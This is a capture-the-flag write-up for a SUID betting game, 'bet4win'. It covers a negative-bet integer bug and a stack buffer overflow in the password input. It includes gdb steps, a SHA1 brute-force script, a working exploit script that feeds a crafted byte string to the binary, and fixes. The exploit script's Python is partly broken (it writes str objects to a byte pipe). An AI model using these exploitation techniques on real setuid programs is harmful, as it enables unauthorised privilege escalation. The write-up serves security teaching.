@@ -1,0 +1,123 @@
+bet4win
+=======
+
+Overview
+--------
+The software is a game. 
+The player starts with 10 coins and can set his maximum amount of coins every round. 
+Afterwards he has to pick a number between 1-12 and if the player is right he gets double the coins he set. 
+If not he lost all coins set and if he has nothing left the game is done and can be played again. 
+If the player somehow has more than 99999999 coins he can guess the password.
+If the correct password is entered, the flag is shown. 
+The flag is owned by the same group, as the binary file "bet4win" and the SUID flag on "bet4win" is set, while the flag can be accessed in the binary.
+
+Vulnerability
+-------------
+The main vulnerability in this exercise used is called “buffer overflow”.
+The first vulnerability which is important for this attack is to understand the given c code. It appears in the game method.
+°°°
+if (set_coins > (int)coins) {
+        printf("You cannot set more coins than you own!\n");
+        continue;
+}else {
+        coins = coins - set_coins;
+}
+°°°
+In this part you are able to give the input a large negative digit and it will still set the coins and - - = +.
+°°°
+if (scanf("%d", &guess) != 1) {
+        fprintf(stderr, "SOMETHING WENT WRONG");
+        exit(1);
+}
+
+if ((rand() % 12) +1 == guess) {
+        printf("You won %d coin\n", set_coins * 2);
+        coins = coins + set_coins * 2;
+} else {
+        printf("You lost %d coin\n", set_coins);
+}
+°°°
+Then you don’t have to write a number between 1-12. Therefore just use a number between under 1 and you always loose. 
+This leads to your opportunity that you will “loose” your coins. 
+But in this case you are losing negative coins and therefore own after the loose the set coins plus the coins you had before (probably 10). 
+Afterwards you have enough coins to use the second option “2” and be able to input the password.
+A buffer overflow is possible, when the input value is bigger than the buffer, but is still written into the buffer. 
+That means that the buffer contains as many elements as it’s size allows and the remaining part of the input is put into the next address in the stack. 
+This can leads to several problems, as it might overwrite variables which are used in the software later on or maybe even overwrites pointers of functions, which could lead to an unwanted function call.  
+Mostly C programs are having this issue, which take input and write that into a buffer, without checking the input length. 
+Functions like scanf and strcpy are vulnerable to buffer overflows, instead use fgets, sscanf and strlcpy to not let that happen.
+
+
+Exploitation
+------------
+
+1. cd /challenges/bet4win
+2. Start gdb with "gdb -q ./bet4win"
+3. "disas get_information" to see stack addresses in the get_information function
+4. get address where scanf is used
+5. set breakpoint one address after scanf "b *{address of one after scanf}" 
+6. Run the program with the following command: r $(python3 -c 'print("A"*40)')
+7. now check with "x/40wx $esp" at which address 0x41 occures for the first time and are overwritten by our input (buffer overflow)
+8. The beginning of the password array is where the sequence of 0x41 (letter A) starts, which in this case corresponds to an address. To check x/wx address. Now we know how long is the password or by checking the c code in the scanf.
+9. Now I wrote a bruteforce script which calculates SHA1 hashes for a random string and stopes when the last 3 bytes are matching [0x00 0xc7 0x91]:
+hex(pw)\x00hex(hash(salt+pw)) with last 3 bytes matching [0x00 0xc7 0x91]
+°°°
+import hashlib
+import random
+import string
+
+while 1:
+    pw = ''.join(random.choice(string.ascii_lowercase) for x in range(19))
+    # 0x61, 0x73, 0x39, 0x62, 0x32, 0x33, 0x42, 0x45
+    salt = "as9b23BE"
+    hash_ = hashlib.sha1(salt.encode() + pw.encode()).hexdigest()
+    # 0x00 0xc7 0x91
+    if hash_[39] == '1' and hash_[38] == '9' and hash_[37] == '7' and hash_[36] == 'c' and hash_[35] == '0' and hash_[34] == '0':
+        print(pw)
+        print(hash_)
+        break
+
+salt_hex = ""
+pw_hex = ""
+for i in range(len(salt)):
+    salt_hex += salt[i].encode('utf-8').hex()
+for i in range(len(pw)):
+    pw_hex += pw[i].encode('utf-8').hex()
+pw_with_hash = pw_hex + "00" + salt_hex + hash_
+final = ""
+for i in range(0, int(len(pw_with_hash)), 2):
+    final = "{0}\\x{1}{2}".format(final, pw_with_hash[i], pw_with_hash[i + 1])
+print(final)
+°°°
+10. The bruteforce stopped at the following output:
+"vabrlpogevufbpmlqqi" (converted to ascii hex after)
+"aaceece94b19c731dda1c832a9015054ea00c791" hash (converted as well to hex)
+final hex = \x76\x61\x62\x72\x6c\x70\x6f\x67\x65\x76\x75\x66\x62\x70\x6d\x6c\x71\x71\x69\x00\x61\x73\x39\x62\x32\x33\x42\x45\xaa\xce\xec\xe9\x4b\x19\xc7\x31\xdd\xa1\xc8\x32\xa9\x01\x50\x54\xea\x00\xc7\x91
+11.Now i created a python file at the Home directory with "nano exploit.py". To get there just use "cd ~".
+Script:
+°°°
+import subprocess
+
+popen = subprocess.Popen(("/challenges/bet4win/bet4win"), stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+print(popen.stdout.readline())
+print(popen.stdout.readline())
+popen.stdin.write('1\n')
+print(popen.stdout.readline())
+print(popen.stdout.readline())
+popen.stdin.write('-1000000000\n')
+print(popen.stdout.readline())
+popen.stdin.write('-12\n')
+print(popen.stdout.readline())
+print(popen.stdout.readline())
+popen.stdin.write('2\n')
+popen.stdin.write(
+    b'\x76\x61\x62\x72\x6c\x70\x6f\x67\x65\x76\x75\x66\x62\x70\x6d\x6c\x71\x71\x69\x00\x61\x73\x39\x62\x32\x33\x42\x45\xaa\xce\xec\xe9\x4b\x19\xc7\x31\xdd\xa1\xc8\x32\xa9\x01\x50\x54\xea\x00\xc7\x91')
+popen.stdin.write('\n')
+print(popen.stdout.read())
+°°°
+
+Solution
+--------
+1. Change "scanf("%45s", password);" to "scanf("%20s", password);" so only 20 characters instead of 45 characters are taken in the input.
+2. Make a different approach to get the input of the user instead of scanf. 
+For example to use fgets which only takes as many characters as the buffer allows and afterwards use sscanf for further usage.
